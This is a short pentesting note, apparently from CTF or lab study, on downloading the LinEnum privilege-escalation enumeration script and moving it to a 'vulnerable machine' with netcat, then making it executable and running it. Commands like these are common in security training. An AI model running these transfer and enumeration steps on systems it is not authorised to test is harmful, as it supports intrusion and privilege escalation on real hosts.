```
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

Upload this to vulnerable machine:
[[Web Hosting#Python HTTP]]

Netcat:
target:
(May need to be in /tmp for write permissions)
`nc -l -p 1337 > LinEnum.sh`
host:
```
nc -w -3 10.10.30.87 1337 < LinEnum.sh
```

Set permission:
`chmod +x LinEnum.sh`

execute:
`./LinEnum.sh`